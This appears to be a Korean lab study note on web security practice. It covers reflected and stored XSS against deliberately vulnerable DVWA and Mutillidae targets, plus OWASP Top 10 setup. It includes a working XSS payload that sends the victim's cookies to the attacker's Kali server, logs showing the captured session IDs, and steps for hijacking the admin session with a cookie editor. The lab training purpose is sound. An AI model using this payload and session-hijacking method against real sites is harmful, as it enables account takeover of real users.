# Wireshark
패킷 캡쳐 프로그램
<br><br><br><br>

# Reflected XSS
- 특정한 피해자를 대상으로 함
- 웹 서버에 XSS가 남는 것은 아님

실습 방법
1. 칼리에 웹서버를 설치 후 `tail -f` 로 로그파일 모니터링 시작
2. 윈도우에서 DVWA에 `admin:password` 로 로그인 한 뒤 XSS reflected에 아래 내용 입력
``` js
<script>document.location='http://192.168.60.128/cookie?'+document.cookie</script>
```
3. 윈도우에서 `404 Not Found` 가 보임과 동시에 칼리에서는 쿠키 정보로써 세션을 탈취한 아래 내용이 보임
``` wrap
192.168.60.1 - - [09/Apr/2021:17:18:51 +0900] "GET /cookie?security=low;%20PHPSESSID=48b916e85b42330e04852ff049d5f064 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
```
4. 칼리에서 DVWA에 `pablo:letmein` 또는 `smithy:password` 로 로그인
5. Cookie Editor 에서 `PHPSESSID` 를 로그 파일의 내용으로 변경
6. 새로고침 하면 왼쪽 아래에 Username 이 admin 으로 된 것을 볼 수 있음
7. 윈도우에서 로그인 된 admin 을 로그아웃 한 후 칼리에서 새로고침 하면 세션이 끊겨서 같이 로그아웃 되는 것을 볼 수 있음
<br><br><br><br>

# Stored XSS
- 임의의 다수를 대상으로 함
- ‘Stored’ 단어처럼 웹서버에 XSS를 저장해서 남김
<br><br><br><br>

# OWASP Top 10
특정 해마다 웹 취약점 중에서 빈도가 많고 보안상 영향을 크게 주는 10가지를 선정해서 발표됨
이 취약점들을 `Mutillidae` 에서 실습 해볼 것임
<br><br><br><br>

# Mutillidae
시작하기에 앞서 `Metasplotiable2` 운영체제의 루트 권한으로 `/var/www/multillidae/config.inc` 파일을 아래 내용에 맞춰 수정하자.
``` php
$dbname = 'owasp10';
```
이로써 데이터베이스가 정상 연결되어 회원가입 등이 원할하게 사용된다.

아까와 같이 `XSS` 실습을 `Mutillidae` 에서 해보자.

1. 칼리에서 `tail -f /var/log/nginx/access.log` 로 로그 모니터링
2. 윈도우에서 `test:test` 회원가입 후 로그인
3. `OWASP Top 10` > `A2 (XSS)` > `Reflected` > `DNS Lookup` 에서 아까와 같은 스크립트를 실행하면 아래와 비슷한 로그 확인
``` wrap
192.168.60.1 - - [09/Apr/2021:18:07:39 +0900] "GET /cookie?username=test;%20uid=17;%20PHPSESSID=2aae495d56711c667e53e602925e5876 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
```
4. 쿠키 값으로 `username` / `uid` / `PHPSESSID` 가 보이는데 이것을 칼리 Cookie Editor 로 전부 입력 후 새로고침
5. 왼쪽 상단에 `Logged In User` 가 `test` 인것을 확인할 수 있음

만약 재현을 하려고 윈도우와 칼리에서 웹 브라우저 주소창 왼쪽의 좌물쇠 모양을 누르고 쿠키들을 모두 지워주면 된다.
